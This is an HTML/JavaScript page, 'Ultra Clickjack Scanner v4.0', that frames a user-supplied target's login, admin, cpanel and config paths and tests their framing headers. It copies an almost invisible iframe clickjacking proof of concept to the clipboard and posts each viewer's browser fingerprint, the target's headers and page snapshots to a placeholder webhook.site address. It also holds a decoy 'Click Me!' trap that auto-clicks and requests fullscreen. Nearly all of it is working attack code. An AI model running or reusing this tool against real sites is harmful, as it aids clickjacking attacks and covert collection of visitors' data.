<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Ultra Clickjack Scanner v4.0 - God Mode</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      font-size: 13px;
      padding: 10px;
    }
    iframe {
      margin: 10px;
      border: 5px solid gray;
    }
    .result {
      margin: 5px;
      padding: 5px;
      border-left: 3px solid;
      white-space: pre-wrap;
    }
    #clickTrap {
      position: fixed;
      top: 80px;
      left: 80px;
      width: 160px;
      height: 60px;
      background: rgba(255, 0, 0, 0.5);
      z-index: 99998;
      text-align: center;
      line-height: 60px;
      font-weight: bold;
      font-family: sans-serif;
      color: white;
      border: 2px dashed white;
      cursor: pointer;
    }
    #hud {
      position: fixed;
      top: 10px;
      left: 10px;
      padding: 10px;
      background: black;
      color: white;
      font-family: monospace;
      z-index: 99999;
      border: 1px solid lime;
    }
  </style>
</head>
<body>
  <div id="hud">
    🛡️ <b>Ultra Clickjack Scanner v4.0</b> - God Mode<br>
    ✅ Green = VULNERABLE<br>
    ⚠️ Orange = FRAMEABLE (But CSP/XFO exists)<br>
    ❌ Red = BLOCKED (load or denied)<br>
    🕵️ Trap + DOM Snapshot + postMessage + Headers Active
  </div>
  <div id="clickTrap">🎯 Click Me!</div>
  <script>
    const webhook = "https://webhook.site/YOUR-UNIQUE-ID"; // Replace with your webhook

    const urlParams = new URLSearchParams(window.location.search);
    let origin = urlParams.get("target") || prompt("🚨 Enter target URL (e.g., https://example.com):");
    if (!origin || !/^https?:\/\/.+/i.test(origin)) throw new Error("❌ Invalid target URL");

    const endpoints = ["", "/", "/login", "/admin", "/dashboard", "/portal", "/signin", "/secure", "/auth", "/panel", "/settings", "/account", "/user", "/profile", "/index", "/home", "/console", "/clients", "/support", "/cpanel", "/config", "/access", "/myaccount", "/members", "/gateway"];

    const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
    const sleep = ms => new Promise(res => setTimeout(res, ms));
    const fingerprint = () => ({
      ua: navigator.userAgent,
      lang: navigator.language,
      screen: { w: screen.width, h: screen.height },
      window: { w: window.innerWidth, h: window.innerHeight },
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      platform: navigator.platform,
      vendor: navigator.vendor
    });

    const getDOMSnapshot = (doc) => {
      try {
        return [...doc.querySelectorAll("h1,h2,h3,p,a,button")].map(e => e.innerText).filter(Boolean).slice(0, 5).join(" | ").substring(0, 300);
      } catch (e) {
        return "N/A";
      }
    };

    const detectHeaders = async (url) => {
      try {
        const res = await fetch(url, { method: "HEAD", mode: "cors" });
        const headers = {};
        for (let [k, v] of res.headers.entries()) headers[k.toLowerCase()] = v;
        return headers;
      } catch (e) {
        return { error: e.toString() };
      }
    };

    const detectPostMessageListener = (win) => {
      try {
        const randMsg = "PING-" + Math.random().toString(36).substring(2);
        const listener = (e) => {
          if (e.data && typeof e.data === 'string' && e.data.includes(randMsg)) {
            console.log("postMessage reply:", e.data);
          }
        };
        window.addEventListener("message", listener);
        win.postMessage(randMsg, "*");
      } catch (e) {}
    };

    const copyPoC = (url) => {
      const code = `<iframe src=\"${url}\" width=800 height=600 style=\"border:0;position:absolute;top:0;left:0;opacity:0.01;z-index:99999\" sandbox=\"allow-scripts allow-same-origin\"></iframe>`;
      navigator.clipboard?.writeText(code);
    };

    const testFrame = async (fullURL) => {
      const headers = await detectHeaders(fullURL);
      const xfo = headers['x-frame-options'] || 'NONE';
      const csp = headers['content-security-policy'] || 'NONE';

      const div = document.createElement("div");
      div.className = "result";
      document.body.appendChild(div);

      const iframe = document.createElement("iframe");
      iframe.src = fullURL;
      iframe.width = rand(800, 1000);
      iframe.height = rand(300, 450);
      iframe.sandbox = "allow-scripts allow-same-origin";
      document.body.appendChild(iframe);

      iframe.onload = async () => {
        let snapshot = "Cross-origin (DOM blocked)";
        try {
          if (new URL(fullURL).origin === window.location.origin) {
            const doc = iframe.contentDocument || iframe.contentWindow.document;
            snapshot = getDOMSnapshot(doc);
          }
        } catch (e) {}

        const vulnerable = (xfo === 'NONE' && csp === 'NONE');
        const color = vulnerable ? "lime" : "orange";
        iframe.style.border = `5px solid ${color}`;
        div.style.borderColor = color;

        div.innerText = `${vulnerable ? '✅ VULNERABLE' : '⚠️ FRAMEABLE with CSP/XFO'} ${fullURL}\nDOM Snapshot: ${snapshot}\nXFO: ${xfo}\nCSP: ${csp}`;

        detectPostMessageListener(iframe.contentWindow);
        copyPoC(fullURL);

        await fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: vulnerable ? "VULNERABLE" : "FRAMEABLE", url: fullURL, fingerprint: fingerprint(), snapshot, headers })
        });
      };

      iframe.onerror = () => {
        iframe.style.border = "5px solid red";
        div.style.borderColor = "red";
        div.innerText = `❌ ${fullURL}\nBLOCKED (Load error or X-Frame DENY)\nXFO: ${xfo}\nCSP: ${csp}`;
      };
    };

    (async () => {
      for (const path of endpoints) {
        const fullURL = origin.replace(/\/$/, "") + path;
        await testFrame(fullURL);
        await sleep(rand(300, 700));
      }
    })();

    document.getElementById("clickTrap").addEventListener("mouseover", () => {
      setTimeout(() => {
        document.getElementById("clickTrap").click();
        document.documentElement.requestFullscreen?.();
      }, 1000);
    });
  </script>
</body>
</html>
